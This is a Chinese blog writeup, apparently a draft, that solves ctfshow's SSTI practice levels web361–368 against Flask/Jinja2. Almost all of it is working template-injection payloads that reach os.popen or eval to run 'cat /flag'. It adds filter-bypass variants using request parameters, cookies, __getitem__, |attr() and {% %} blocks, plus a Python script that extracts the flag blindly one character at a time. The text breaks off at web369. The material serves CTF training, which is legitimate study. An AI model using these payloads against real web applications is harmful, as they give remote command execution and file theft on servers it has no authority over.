---
title: "Ctfshow Web入门[SSTI] Writeup"
date: 2022-08-23T19:05:46+08:00
lastmod: 2022-08-23T19:05:46+08:00
draft: true
author: "X1r0z"

tags: []
categories: []

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

<!--more-->

## web361

```
http://b32fe9fe-022c-426e-86e1-60f89fa6b833.challenge.ctf.show/?name={{''.__class__.__mro__[-1].__subclasses__()}}
```

找到 `<class 'os._wrap_close'>`

索引不太好找, 大致估一下然后微调

```
http://b32fe9fe-022c-426e-86e1-60f89fa6b833.challenge.ctf.show/?name={{''.__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}
```

## web362

试了下发现 `__subclasses__()` 后的内容被过滤了, 不能访问列表里面的内容

换成 flask 里的内置类, 这里用 config

```
http://3d34ef4f-b839-44b9-b203-6a0bac9b3a96.challenge.ctf.show/?name={{ config.__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /flag").read()')}}
```

实际上随便一个不存在的类也可以执行成功, 因为 flask 单独对 undefined 的类做了包装

## web363

过滤了引号

用 request 逃逸

```
http://53fb7f41-e2e2-4c3b-be99-5698927a04f1.challenge.ctf.show/?name={{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()}}&a=popen&b=cat /flag
```

## web364

过滤了引号和 request.args

换成 request.form 提示 `Method Not Allowed`

于是换成 request.cookies

```
http://d690e47a-453a-46a4-ae50-62777cc2ee8c.challenge.ctf.show/?name={{xx.__init__.__globals__[request.cookies.a][request.cookies.b](request.cookies.c)}}
```

cookie 内容为 `a=__builtins__; b=eval; c=__import__('os').popen('cat /flag').read()`

后来发现用 requests.values 也行, 同时接收 get 和 post 的数据

## web365

同上, 还过滤了 `[]`

使用 `__getitem__()` 绕过

```
http://c2ffa348-5bb5-4f54-afb4-d5bbcb941b57.challenge.ctf.show/?name={{xx.__init__.__globals__.__getitem__(request.values.a).eval(request.values.b)}}&a=__builtins__&b=__import__('os').popen('cat /flag').read()
```

## web366

还过滤了下划线

通过 `|attr()` 过滤器绕过

```
http://36f7bb7e-2b2d-4455-aaf5-6c3a4e42ec5b.challenge.ctf.show/?name={{(xx|attr(request.values.a)|attr(request.values.b)).get(request.values.c).eval(request.values.d)}}&a=__init__&b=__globals__&c=__builtins__&d=__import__('os').popen('cat /flag').read()
```

注意 get() 前面的内容需要用括号包一次, 不然后面的语句会被认为是过滤器的代码

## web367

听说是过滤了 os?

payload 同上

## web368

过滤了 `{{}}`

貌似不出网, 用盲注试试

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208232146485.png)

python 脚本

```python
import requests

dicts = 'ctfshow{abde-0123456789}'

flag = ''

for i in range(100):
    for s in dicts:
        url = 'http://7606dc4d-5a13-4131-8496-cd184cf9f1ea.challenge.ctf.show/'
        params = {
            'name': '{% if (xx|attr(request.values.a)|attr(request.values.b)).get(request.values.c).eval(request.values.d) == request.values.e%}OK{%endif%}',
            'a': '__init__',
            'b': '__globals__',
            'c': '__builtins__',
            'd': "__import__('os').popen('cat /flag').read()[" + str(i) + "]",
            'e': s
        }
        res = requests.get(url,params=params)
        if 'OK' in res.text:
            flag += s
            print(flag)
            break
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208232157916.png)

wp 上看到直接 print 就行...

```
http://7606dc4d-5a13-4131-8496-cd184cf9f1ea.challenge.ctf.show/
?name={%print((xx|attr(request.values.a)|attr(request.values.b)).get(request.values.c).eval(request.values.d))%}&a=__init__&b=__globals__&c=__builtins__&d=__import__('os').popen('cat /flag').read()
```

或者是 `{% set x=....%}` 设置一个变量, 然后再把变量打印出来

## web369

又过滤了 request

